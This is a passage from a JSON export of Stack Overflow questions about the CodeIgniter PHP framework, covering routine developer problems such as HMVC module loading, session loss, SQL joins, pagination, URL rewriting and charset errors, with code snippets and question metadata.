href=\"https://bitbucket.org/wiredesignz/codeigniter-modular-extensions-hmvc/wiki/Home\" rel=\"nofollow\">https://bitbucket.org/wiredesignz/codeigniter-modular-extensions-hmvc/wiki/Home</a></p>\n\n<p>I get to my welcome controller/view as example just fine which means the HMVC is working. Next I try to add tank auth to the project by adding it to a folder in the modules folder. It has the proper controller/view/model etc.. setup within the tank auth. I even added in routes something like</p>\n\n<p>$route[\"auth\"]=\"auth/login\"; </p>\n\n<p>I also extended the controller within the auth module to MX_Controller like as directed. Also in the constructor I have :</p>\n\n<pre><code>$this-&gt;load-&gt;helper(array('form', 'url'));\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;load-&gt;library('security'); &lt;--failing to load this\n\n    $this-&gt;load-&gt;library('tank_auth');\n    $this-&gt;lang-&gt;load('tank_auth');\n     $this-&gt;form_validation-&gt;CI =&amp; $this;\n</code></pre>\n\n<p>It seems to be redirecting fine to the module however it comes up with an error saying ::</p>\n\n<p>An Error Was Encountered</p>\n\n<p>Unable to load the requested class: security</p>\n\n<p>What am I doing wrong? Does any one have a working CI installation with HMVC and tank auth as a module so I can see how its done? I'm new to HMVC, thanks</p>\n"},{"tags":["php","mysql","codeigniter","file-upload","grocery-crud"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":138,"score":0,"question_id":12542158,"title":"checking file format during upload a file in grocery CRUD","body":"<p>I have the following code for file upload using grocery CRUD</p>\n\n<pre><code>function test(){\n        $crud=new grocery_CRUD();       \n        $crud-&gt;set_table('test');\n        $crud-&gt;add_fields('name', 'image');\n        $crud-&gt;set_field_upload('image', 'test');\n        $crud-&gt;callback_before_upload('image', array($this, 'before_test_upload'));\n        $output=$crud-&gt;render();\n        $output-&gt;page_title=\"Test Page\";\n        $this-&gt;_crud_output($output);       \n    }\nfunction before_test_upload($files_to_upload, $field_info){\n        // Here I want to check the file format before that file upload to source folder.\n    }\n</code></pre>\n"},{"tags":["mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12532348,"title":"Illegal mix of collations in mysql + codeigniter","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12247120/mysql-illegal-mix-of-collations\">MySQL Illegal mix of collations</a>  </p>\n</blockquote>\n\n\n\n<p>I am implementing a query using codeigniter framework.</p>\n\n<p>I always get this error \"Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation '='\" When implementing this query below:</p>\n\n<pre><code> $customer_name = \"orduña's\";\n\n $escape_string = mysql_escape_string($customer_name);\n\n $sql = \"SELECT* FROM raw_customer WHERE customer_name ='$escape_string'\";\n $query = $this-&gt;db-&gt;query($sql);\n return $query-&gt;row_array();\n</code></pre>\n\n<p>I am very sure that my database is already set to utf8 charset and utf8_general_ci for collation and even tried utf8_unicode_ci.</p>\n\n<p>I am also very sure that my database tables are also consistent to utf8 as well.</p>\n\n<p>I am also very sure that utf 8 meta tags in headers are also implemented on the head tag.</p>\n"},{"tags":["php","codeigniter","code-organization"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":149,"score":4,"question_id":12458310,"title":"Where to put and how to load result object class in Codeigniter?","body":"<p>I'm looking for proper way to organize 'Result object classes' in CodeIgniter. These classes are usualy used in models as described in <a href=\"http://codeigniter.com/user_guide/database/results.html\" rel=\"nofollow\">documentation</a>:</p>\n\n<blockquote>\n  <p>You can also pass a string to result() which represents a class to\n  instantiate for each result object (note: this class must be loaded)</p>\n</blockquote>\n\n<pre><code>$query = $this-&gt;db-&gt;query(\"SELECT * FROM users;\");\n\nforeach ($query-&gt;result('User') as $row)\n{\n   echo $row-&gt;name; // call attributes\n   echo $row-&gt;reverse_name(); // or methods defined on the 'User' class\n}\n</code></pre>\n\n<p>So, where to put 'User' class and is there any 'offical' way how to load it?</p>\n"},{"tags":["codeigniter","activerecord","frontend"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12523928,"title":"Build Frontend Forum with Codeigniter","body":"<p>I have 3 Table</p>\n\n<pre><code>|forum_id|name_forum|\n|   1    |forum 1   |\n\n|thread_id|name_thread|forum_id|\n|    1    |Thread 1   |   1    |\n\n|post_id|name_post|text|thread_id|\n|   1   | post 1  |tttt|   1     |\n</code></pre>\n\n<ul>\n<li>i build page 1 to show forum_name</li>\n<li>page 2 to show name_thread group by forum_id ( CAN I INSERT NAME_THREAD  GROUP BY FORUM_ID? )</li>\n<li>page 3 to show name_post and text group by thread_id ( CAN I INSERT NAME_POST GROUP_BY THREAD_ID? )</li>\n</ul>\n\n<p>I build with codeigniter. i can show all this issue, but i cant insert thread and post.</p>\n\n<pre><code>class Forum extends CI_Controller{\n    private $limit = 10;\n\n    function __construct() {\n        parent::__construct();\n        //load library helper\n        $this-&gt;load-&gt;library(array('table','form_validation'));\n        $this-&gt;load-&gt;helper(array('form','url'));\n        $this-&gt;load-&gt;model('home_forum_model','',TRUE);\n        $this-&gt;load-&gt;helper('date');\n        $this-&gt;is_logged_in();\n    }\n\n    function index($offset=0,$order_column='forum_id',$order_type='ASC')\n    {\n        if(empty($offset)) $offset=0;\n        if(empty($order_column)) $order_column='forum_id';\n        if(empty($order_type)) $order_type='asc';\n        //Untuk cek validasi kolom\n\n        //tanggal\n        $data['datestring'] =\"Tanggal: %d  %M  %Y  \";\n        $data['time']=time();\n        $data['zona']= timezones('UP7');\n\n        //load data siswa\n        $forums = $this-&gt;home_forum_model-&gt;get_paged_list($this-&gt;limit,$offset,$order_column,$order_type)-&gt;result();\n        //pagination\n        $this-&gt;load-&gt;library('pagination');\n        $config['base_url']= site_url('home/forum/index/');\n        $config['prev_link']='&amp;ltPrev';\n        $config['next_link']='Next&amp;gt';\n        $config['first_link']='&amp;lt&amp;ltFirst';\n        $config['last_link']='Last&amp;gt&amp;gt';\n        $config['total_rows']= $this-&gt;home_forum_model-&gt;count_all_forum();\n        $config['per_page'] = $this-&gt;limit;\n        $config['uri_segment'] = 4;\n        $this-&gt;pagination-&gt;initialize($config);\n        $data['pagination'] = $this-&gt;pagination-&gt;create_links();\n\n        //table data\n        $this-&gt;load-&gt;library('table');\n        $this-&gt;table-&gt;set_empty('&amp;nbsp');\n        $tmpl = array ( 'table_open'  =&gt; '&lt;table border=\"10\" style=\"color:black;align:left\" cellpadding=\"2\" cellspacing=\"2\" class=\"mytable\"&gt;' );\n        $this-&gt;table-&gt;set_template($tmpl);\n        //$new_order = ($order_type == 'asc'?'desc':'asc');\n\n        $this-&gt;table-&gt;set_heading(\n                'Nama Forum');\n        //$i=0+$offset;\n        foreach($forums as $forum)\n        {\n            $this-&gt;table-&gt;add_row(\n                    anchor('home/forum/view_thread/'.$forum-&gt;forum_id,$forum-&gt;nama_forum,array('class'=&gt;'view_thread') )\n\n                    );\n            $this-&gt;table-&gt;add_row($forum-&gt;deskripsi);\n        }\n\n\n        $data['table']=$this-&gt;table-&gt;generate();\n        $data['content']='home/tampil_forum';\n        $this-&gt;load-&gt;view('template_home/template',$data);\n    }\n\nfunction view_thread($id)\n    {\n        //tanggal\n        $data['datestring'] =\"Tanggal: %d  %M  %Y  \";\n        $data['time']=time();\n        $data['zona']= timezones('UP7');\n\n        $data['title']='Detail Forum';\n        $data['action']=site_url('home/forum/view_thread/');\n        $data['link_back']=anchor('home/forum/index/','Lihat Daftar Forum',array('class'=&gt;'back'));\n\n        //ambil detail agenda\n        $data['threads']=$this-&gt;home_forum_model-&gt;get_thread_by_id($id)-&gt;result();\n\n        //load agenda\n        $data['content']='home/tampil_thread';\n        $this-&gt;load-&gt;view('template_home/template',$data);\n    }\n</code></pre>\n\n<p>This the model</p>\n\n<blockquote>\n  <p>class Home_forum_model extends CI_Model{\n      private $primary_key = 'forum_id';\n      private $table_name = 'forum';</p>\n\n<pre><code>function __construct() {\n    parent::__construct();\n}\n\nfunction get_paged_list($limit=10,$offset=0,$order_column='',$order_type='asc')\n{\n    if(empty($order_column) || empty($order_type))\n    {\n        $this-&gt;db-&gt;order_by('forum_id','asc');\n    }else{\n        $this-&gt;db-&gt;order_by($order_column,$order_type);\n        return $this-&gt;db-&gt;get('forum',$limit,$offset);\n    }\n}\nfunction get_forum()\n{\n    return $this-&gt;db-&gt;get('forum');\n}\n\nfunction count_all_forum(){\n    return $this-&gt;db-&gt;count_all($this-&gt;table_name);\n}\n\nfunction count_all_thread(){\n    return $this-&gt;db-&gt;count_all('thread');\n}\n\nfunction count_all_post(){\n    return $this-&gt;db-&gt;count_all('post');\n}\n\nfunction get_post_by_id($id)\n{\n    $this-&gt;db-&gt;select('post.*,post.nama_post as judulpost,post.text as isipost');\n    $this-&gt;db-&gt;from('post');\n    $this-&gt;db-&gt;join('thread','post.thread_id=thread.thread_id');\n    $this-&gt;db-&gt;where('post.thread_id',$id);\n    $this-&gt;db-&gt;order_by('post.post_id','asc');\n    return $this-&gt;db-&gt;get();\n}\n\nfunction get_thread_by_id($id)\n{\n    $this-&gt;db-&gt;select('thread.*,thread.title as title,forum.nama_forum as forum');\n    $this-&gt;db-&gt;from('thread');\n    $this-&gt;db-&gt;join('forum','thread.forum_id = forum.forum_id');\n    $this-&gt;db-&gt;where('thread.forum_id',$id);\n    $this-&gt;db-&gt;order_by('thread.thread_id','desc');\n    return $this-&gt;db-&gt;get();\n}\n</code></pre>\n</blockquote>\n"},{"tags":["php","codeigniter","include"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12540587,"title":"Including Files in Parent Folders PHP","body":"<p>In my root html directory, i have an installation of SMF, and also an installation of CodeIgniter.  I am making a custom library of the SMF SSI for use in CI, but I'm having trouble including the SSI.php file.  This is what my html root directory looks like:</p>\n\n<pre><code>- html/root\n  /forums (html/forums)\n      -SSI.php\n  /application\n      /libraries\n          -SMF.php(html/application/libraries)\n  /system\n</code></pre>\n\n<p>So in the file application/libraries/smf.php, how would I include SSI.php?  This is what I am using, but it says file not found</p>\n\n<p><code>include('.../forums/SSI.php'); </code></p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12453423,"title":"CodeIgniter: Session values lost on redirect","body":"<p>I set session in a controller method like &amp; redirect to some other controller.</p>\n\n<pre><code>$search = array(\n    'search_count' =&gt; count($data['result']),\n    'projectInfo' =&gt; $data['result']\n    );\n\n$this-&gt;session-&gt;set_userdata($search);\nredirect('projects');\n</code></pre>\n\n<p>but if I try to access this variable in other controller it shows nothing:</p>\n\n<pre><code>print_r($this-&gt;session-&gt;userdata('projectInfo'));\n</code></pre>\n"},{"tags":["php","mysql","sql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":114,"score":3,"question_id":9313948,"title":"Using SUM with formula based row's text content, All together with WHERE, JOIN, ORDER","body":"<p>I am writing a small application about stock monitoring for my company. Using mysql and codeigniter 2.1.0.</p>\n\n<p>Two tables: deliveries and stockcards</p>\n\n<p>I appreciate the help about building a query to list <strong>stock name</strong> and <strong>remaining quantity</strong>.</p>\n\n<p>Final output is desired to be: (pls look below tables)</p>\n\n<pre><code>&lt;tr&gt;\n  &lt;td&gt;Product Name 1&lt;/td&gt;\n  &lt;td&gt; 2 pcs &lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n  &lt;td&gt;Product Name 2&lt;/td&gt;\n  &lt;td&gt; 5 pcs &lt;/td&gt;\n&lt;/tr&gt;\n</code></pre>\n\n<p>I guess the tasks are:</p>\n\n<p>join tables with id_stock,  <br />\ngroup by id_stock <br />\nunder each group, get 'somehow' sum of quantity where direction = rcvd <br />\nunder each group, get 'somehow' sum of quantity where direction = sent <br />\n'somehow' create a new column for each group with rcvd minus sent = remaining_quantity <br />\norder by stokcards.name ASC<br /></p>\n\n<p>I couldn't manage to make the right fiction and more that the right syntax about it. \nThanks for any help.</p>\n\n<p>Deliveries:</p>\n\n<pre><code>+-------------+----------+-----------+----------+\n| id_delivery | id_stock | direction | quantity |\n+-------------+----------+-----------+----------+\n|    A.I.     |    1     |   rcvd    |     15   |\n|             |    1     |   sent    |     13   |\n|             |    2     |   rcvd    |     50   |\n|             |    2     |   sent    |     45   |\n+-------------+----------+-----------+----------+\n</code></pre>\n\n<p>Stockcards:</p>\n\n<pre><code>+----------+-----------------+\n| id_stock |       name      |\n+----------+-----------------+\n|    1     |  Product Name 1 |\n|    2     |  Product Name 2 |\n+----------+-----------------+\n</code></pre>\n"},{"tags":["php","mysql","sql","codeigniter","join"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":141,"score":1,"question_id":9099851,"title":"how get unique rows using join from one table?","body":"<p>I am using codeigniter 2 in my project and I have a problem that I hope that you'll help me in solving it.</p>\n\n<p>I have two mysql tables,\"<strong>authors</strong>\" and \"<strong>articles</strong>\" where relation is as \"one author to many articles\". I need to get authors \"from '<strong>authors</strong>'\" that have already active articles in \"<strong>articles</strong>\".</p>\n\n<p><strong>note</strong> that in articles table, I have column called \"status_id\" that set to 1 if the article is active or 0 if suspended. and I have in \"<strong>authors</strong>\" table a record called \"authors_categories_id\".</p>\n\n<p>I tried to do it with this code</p>\n\n<pre><code>$this-&gt;db-&gt;select('authors.name,authors.about,authors.author_thumbnail,authors.authors_categories_id,authors.user_id,authors.status_id,authors.id AS auth_id')\n                  -&gt;from('authors')\n                  -&gt;join('articles', 'authors.id = articles.author_id')\n                  -&gt;where('authors.authors_categories_id',$AuthCategory)\n                  -&gt;where('articles.status_id', 1)\n                  -&gt;order_by(\"auth_id\", \"desc\")\n                  -&gt;limit($limit, $start);\n            $Res = $this-&gt;db-&gt;get();\n            $data['Authors'] = array();\n            foreach($Res-&gt;result() as $R)\n            {\n                $data['Authors'][] = $R;\n            }\n            print_r($data['Authors']);\n</code></pre>\n\n<p>My problem that the code results me duplicated authors. <strong><em>for example</em></strong>, if an author have 5 articles in 'articles' table, <strong>the result will be 5 records for the same author while i need to view each author just once not more</strong>.</p>\n\n<p>I need the code to generate records according to count of authors not articles.</p>\n\n<p>thanks.</p>\n"},{"tags":["php","session","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1925,"score":2,"question_id":4431250,"title":"size of session in codeigniter","body":"<p>How do I increase the size of the session framework CodeIgniter?</p>\n\n<p>The standard size is 04 kb</p>\n"},{"tags":["php","jquery","css","codeigniter","jquery-datepicker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":88,"score":-1,"question_id":12538491,"title":"JQuery datepicker icon trigger broken after inserting data to database","body":"<p>at first i got to load my icon for the JQuery datepicker but after i insert the value to my database the icon image is broken. im using Codeigniter framework.</p>\n\n<p>here's my html code:</p>\n\n<pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html lang=\"en-US\"&gt;\n&lt;head&gt;\n     &lt;meta charset=\"UTF-8\"&gt;    \n     &lt;title&gt;CRUD&lt;/title&gt;\n&lt;?php echo link_tag(base_url() . 'css/ui-lightness/jquery-ui-1.8.23.custom.css'); ?&gt;    \n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url(); ?&gt;js/jquery-1.8.0.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url(); ?&gt;js/jquery-ui-1.8.23.custom.min.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div&gt;\n    &lt;?php\n    echo form_label('BDay:', 'bday');\n\n    $data = array(\n        'name' =&gt; 'bday',\n        'id' =&gt; 'datepicker'\n    ); \n\n    echo form_input($data);\n    ?&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>and here's my jscript:</p>\n\n<pre><code>&lt;script&gt;\n$(function() {\n    $( \"#datepicker\" ).datepicker({\n        changeMonth: true,\n        changeYear: true,\n        showOn: \"button\",\n        buttonImage: \"&lt;?php echo base_url() . '/images/icons/calendar_24.png' ?&gt;\",\n        buttonImageOnly: true,\n        onSelect: function(dateText, inst){\n            $(\"input[name='bday']\").val(dateText);\n        }\n    });\n\n});\n&lt;/script&gt;\n</code></pre>\n\n<p>am i missing something? thanks!</p>\n"},{"tags":["php","mysql","codeigniter","random"],"answer_count":7,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":5963,"score":2,"question_id":1627934,"title":"Random record from mysql database with CodeIgniter","body":"<p>I researched over the internet, but could not find anything...</p>\n\n<p>I have a mysql db, and records at a table, and I need to get random record from this table at every page load. how can I do that? Is there any func for that?</p>\n\n<p>Appreciate! thanks</p>\n\n<p><hr /></p>\n\n<p>SORTED:\nlink: <a href=\"http://www.derekallard.com/blog/post/ordering-database-results-by-random-in-codeigniter/\" rel=\"nofollow\">http://www.derekallard.com/blog/post/ordering-database-results-by-random-in-codeigniter/</a></p>\n\n<pre><code>$this-&gt;db-&gt;select('name');\n$query = $this-&gt;db-&gt;get('table');\n$shuffled_query = $query-&gt;result_array();\nshuffle ($shuffled_query);\n\nforeach ($shuffled_query as $row) {\n    echo $row['name'] . '&lt;br /&gt;';\n}\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","zend-server"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":105,"score":0,"question_id":12439173,"title":"my php script stops exactly after 120 seconds","body":"<p>I am using codeigniter while i am importing table data row by row to a mysql tables where rows are more than 25000 in the table so it takes time to read from one table and insert into another table. </p>\n\n<p>I noticed that every time i run the the my script like: <a href=\"http://domain.local/importdata\" rel=\"nofollow\">http://domain.local/importdata</a> it stops the script after importing some rows and after checking the time of its execution its exactly 120 seconds always.</p>\n\n<p>I tried to set_time_limit(0); but no use still it stops after 120 seconds. </p>\n\n<p>in phpinfo() it shows that default max_execution_time is 300.</p>\n\n<p>In addition I am using zend server on windows machine.</p>\n\n<p>thanks in advance.</p>\n"}]}
{"total":13987,"page":16,"pagesize":100,"questions":[{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12536934,"title":"PHP works locally, not on server","body":"<p>I've been developing a custom CMS using Codeigniter locally and I've just gotten to the point where I need to upload it to a staging server to do some more testing.</p>\n\n<p>Everything works except for the sidebar section of the site that uses a widget system. I initially thought it was just differences between PHP versions, as I am running 5.4.4 locally and the server was 5.3. After upgrading the server to 5.4.7, the sidebar is still not appearing. I get no error, just nothing displays.</p>\n\n<p>This is the Widget library code:</p>\n\n<pre><code>&lt;?php\nif (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Widgets {\n\n    private $_ci;\n    protected $parser_enable = FALSE;\n\n    public function __construct() {\n        $this-&gt;widgets();\n    }\n\n    public function widgets(){\n        $this-&gt;_ci =&amp; get_instance();\n    }\n\n    public function build($view,$data=array()){\n        $view = get_class($this).'/'.$view;\n        $subdir = '';\n        if (strpos($view, '/') !== FALSE)\n        {\n                // explode the path so we can separate the filename from the path\n                $x = explode('/', $view);\n\n                // Reset the $class variable now that we know the actual filename\n                $view = end($x);\n\n                // Kill the filename from the array\n                unset($x[count($x)-1]);\n\n                // Glue the path back together, sans filename\n                $subdir = implode($x, '/').'/';\n        }\n\n        $widget_view = APPPATH.'widgets/'.$subdir.'views/'.$view.EXT;\n\n        if(file_exists($widget_view)){\n            $widget_view = '../widgets/'.$subdir.'views/'.$view.EXT;\n            if($this-&gt;parser_enable){\n                $this-&gt;_ci-&gt;load-&gt;library('parser');\n               return $this-&gt;_ci-&gt;parser-&gt;parse($widget_view,$data,TRUE);\n            }\n            else{\n                return $this-&gt;_ci-&gt;load-&gt;view($widget_view,$data,TRUE);\n            }\n        }\n\n        return FALSE;\n    }\n\n    public function __get($var) {\n        static $ci;\n        isset($ci) OR $ci = get_instance();\n        return $ci-&gt;$var;\n    }\n}\n</code></pre>\n\n<p>Does anything jump out that could cause it not to display?</p>\n\n<p>Is there anything I should be looking at to make it compatible, such as server modules? What on the server could be affecting this?</p>\n\n<p>EDIT:</p>\n\n<p>I have the widgets residing in the following path:</p>\n\n<pre><code>/public_html/application/widgets/recent_news/views/view.php\n</code></pre>\n\n<p>The <code>$widget_view = 'widgets/'.$subdir.'views/'.$view.EXT;</code> variable is returning <code>widgets/Recent_news/views/view.php</code> which is getting passed to:</p>\n\n<pre><code>if(file_exists($widget_view)){\n    return $this-&gt;_ci-&gt;load-&gt;view($widget_view,$data,TRUE);\n}\n</code></pre>\n\n<p>The application path in $widget_view doesn't seem to be correct on the staging server, so file_exists() returns false and doesn't load the view (which would have an incorrect path anyways).</p>\n\n<p>I just can't seem to make it read the correct path, any suggestions?</p>\n"},{"tags":["php","html","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12537433,"title":"How to store only zip files downloaded from other website","body":"<p>I am building a application based in codeigniter. Here i need to download only files that have .zip extension and upload in my local drive. But to do it i had been given  a funtion named get_zip contents are as follows</p>\n\n<pre><code>&lt;?php\nfunction get_file($file, $localpath, $newfilename)\n{\n    $err_msg = '';\n    $out = fopen($localpath.$newfilename,\"wb\");\n    if ($out == FALSE){\n        print \"File not opened&lt;br&gt;\";\n        exit;\n    }\n\n    $ch = curl_init();\n\n    curl_setopt($ch, CURLOPT_FILE, $out);\n    curl_setopt($ch, CURLOPT_HEADER, 0);\n    curl_setopt($ch, CURLOPT_URL, $file);\n\n    curl_exec($ch);\n    if( curl_error($ch) )\n    {\n        echo \"&lt;br&gt;Error is : \".curl_error ( $ch);\n    }\n\n\n    curl_close($ch);\n    //fclose($ch);\n    return $localpath.$newfilename;\n\n}//end function\n\n\nfunction directory_map_echo($source_dir, $directory_depth = 0, $hidden = FALSE)\n{\n    if ($fp = @opendir($source_dir))\n    {\n        $filedata   = '';\n        $new_depth  = $directory_depth - 1;\n        $source_dir = rtrim($source_dir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;\n\n        while (FALSE !== ($file = readdir($fp)))\n        {\n            // Remove '.', '..', and hidden files [optional]\n            if ( ! trim($file, '.') OR ($hidden == FALSE &amp;&amp; $file[0] == '.'))\n            {\n                continue;\n            }\n\n            if (($directory_depth &lt; 1 OR $new_depth &gt; 0) &amp;&amp; @is_dir($source_dir.$file))\n            {\n                $filedata .= 'directory:'.$file.directory_map($source_dir.$file.DIRECTORY_SEPARATOR, $new_depth, $hidden);\n            }\n            else\n            {\n                $filedata .= $file;\n            }\n        }\n\n        closedir($fp);\n        return $filedata;\n    }\n\n    return FALSE;\n}\n</code></pre>\n\n<p>But the problem is how i can restrict that only .zip files will be downloaded and uploaded to my local drive.</p>\n\n<p>This is the problem i am facing and need help.\nThanks\nSodmeb</p>\n"},{"tags":["php","validation","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":137,"score":5,"question_id":12533455,"title":"Codeigniter PHP - loading a view at an anchor point","body":"<p>I have a form at the bottom of a long page, if a user fills out the form but it doesn't validate the page is reloaded in the typical codeigniter fashion:</p>\n\n<p><code>$this-&gt;load-&gt;view('template',$data);</code></p>\n\n<p>however because the form is way down at the bottom of the page I need the page to load down there like you do with HTML anchors. Does anyone know how to do this in codeigniter? </p>\n\n<p>I can't use the codeigniter </p>\n\n<p><code>redirect();</code> </p>\n\n<p>function because it loses the object and the validation errors are gone. Other frameworks I've used like Yii you can call the redirect function like:</p>\n\n<p><code>$this-&gt;redirect();</code></p>\n\n<p>which solves the problem because you keep the object. I've tried using:</p>\n\n<p><code>$this-&gt;index()</code></p>\n\n<p>within the controller which works fine as a redirect but the validation errors are in another method which is where the current page is loaded from: </p>\n\n<p><code>$this-&gt;item($labs)</code></p>\n\n<p>but when I use this it get stuck in a loop</p>\n\n<p>Any ideas? I've seen this question a lot on the net but no clear answers. I'm researching using codeigniter \"flash data\" but think it's a bit overkill.</p>\n\n<p>cheers.</p>\n"},{"tags":["json","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1926,"score":1,"question_id":8596216,"title":"Post JSON to Codeigniter controller","body":"<p>I am trying to receive and parse a JSON object sent in a POST request using Codeigniter but I cannot \"find\" it.</p>\n\n<p>This is my controller code:</p>\n\n<pre><code>public function parse () {\n\n  $json = $this-&gt;input-&gt;post();\n  $json = stripslashes($json);\n  $json = json_decode($json);\n\n  print_r($json);\n\n}\n</code></pre>\n\n<p>This is my JSON object:</p>\n\n<pre><code>{\"data\":\"value\"}\n</code></pre>\n\n<p>Please help!</p>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3194,"score":0,"question_id":4376665,"title":"Codeigniter Tank auth installation","body":"<p>I'm having some problems with Tank Auth.\nAlthough i followed the instructions <a href=\"http://konyukhov.com/soft/tank_auth/\" rel=\"nofollow\">from here</a> when i try to connect in the login_form i get a redirect in <a href=\"http://example.com/auth/login\" rel=\"nofollow\">http://example.com/auth/login</a>.</p>\n\n<p>I assume i can change \"example.com\" with my domain but i can't find where.\nThe other thing is that captcha is not showing.</p>\n\n<p>I suppose i have to learn only from the examples coming with the installation?</p>\n\n<p>Any help is appreciated.</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12529673,"title":"Mod Rewrite for Code Igniter","body":"<p>I have a code igniter site that needs to accept incoming links in the format:</p>\n\n<p><a href=\"http://domain.tld/somename.html?id=IDREF\" rel=\"nofollow\">http://domain.tld/somename.html?id=IDREF</a></p>\n\n<p>I need to create a rule for mod_rewrite that rewrites this URL to:</p>\n\n<p><a href=\"http://domain.tld/index.php/controller/somename/IDREF\" rel=\"nofollow\">http://domain.tld/index.php/controller/somename/IDREF</a></p>\n\n<p>I am having trouble writing the rule for the .htaccess file.</p>\n\n<p>I thought this should work:</p>\n\n<pre><code>RewriteCond ${QUERY_STRING} ^(.*\\.html\\?id=.*)$\n\nRewriteRule ^([^/]*)\\.html\\?id=(.*) /index.php/controller/$1/$2 [L]\n</code></pre>\n\n<p>But as I am a bit of a novice at mod_rewrite I can't get it to work.</p>\n\n<p>Just to clarify I want the user to link to this ugly url and get sent to specific controller.</p>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12532168,"title":"Default value for Pagination in Codeigniter?","body":"<p>I'm wondering if theres a way that you can set a default value for the pagination in Codeigniter.\nFor example, when you enter \"page 2\", it will send out a post data, but If i enter \"page 1\", then it wont send out any post data. So, can I change this? So it sends out a default value for the first page?</p>\n\n<p>Any respons is appreciated. </p>\n"},{"tags":["php","database","codeigniter","object"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12531858,"title":"Codeigniter - How can I sort my database result object (sorting php objects)","body":"<p>Apparently active record cannot deal with temporary tables - huge oversight in my opinion. (ref: <a href=\"http://stackoverflow.com/questions/12518069/codeigniter-2-active-record-how-do-i-create-temporary-table-to-apply-second-so\">Codeigniter 2 active record — How do I create temporary table to apply second sort order?</a> )</p>\n\n<p>In light of this I am looking for a way to sort the result object produced by my query.</p>\n\n<p>Here is my query:</p>\n\n<pre><code>    $this-&gt;db\n                -&gt;select('*')\n                -&gt;from('item_categories')\n                -&gt;where('item_categories.cat_id', $c)\n                -&gt;or_where('item_categories.parent_id', $c)\n                -&gt;or_where('item_categories.gparent_id', $c)\n                -&gt;join('item_categories_rel', 'item_categories_rel.cat_id = item_categories.cat_id', 'right')\n                -&gt;join('item_entries', 'item_entries.item_id = item_categories_rel.item_id','right')\n                -&gt;join('ratings_total', 'ratings_total.item_id = item_entries.item_id')\n                -&gt;order_by(\"item_name\", \"asc\")\n                -&gt;limit($l, $s);\n            $result = $this-&gt;db-&gt;get();\n</code></pre>\n\n<p>So for example my results contain a field called site_rating which is of type decimal(2,1) , how can I sort my result object by site_rating in asc/desc order? Any help greatly appreciated.</p>\n\n<p>To be clear I do not want to change the current order, I want to apply a second sort order to the first result set - I have found I cannot do this with active record so would like to do it by sorting the result object if possible.</p>\n"},{"tags":["php","html","codeigniter","character-encoding"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":783,"score":1,"question_id":6305947,"title":"Portuguese charset problem","body":"<p>I’m a headache with the damn charset.</p>\n\n<p>Portuguese charset=iso-8859-1</p>\n\n<p>On my HTML I have:</p>\n\n<pre><code>&lt;meta http-equiv=\"Content-type\" content=\"text/html; charset=iso-8859-1\" /&gt; \n</code></pre>\n\n<p>On my config.php:</p>\n\n<pre><code>$config['charset'] = 'ISO-8859-1'; \n</code></pre>\n\n<p>I have the word <code>‘café’, coffee.</code></p>\n\n<p>It is been displayed like: <code>cafŽ.</code></p>\n\n<p>Any ideas?!</p>\n\n<p>Thanks in advance for any help</p>\n\n<p>**Edit</p>\n\n<p>I don't know if it matters but I'm using Eclipse</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12528209,"title":"Disallowed key characters error in codeigneiter","body":"<p>When I enable the auto load for sessions in the <code>autoload.php</code> file and pass my <code>encryption_key</code> in the config file and set <code>sess_use_database</code> to <code>TRUE</code>, I got the disallowed key characters when I ran the 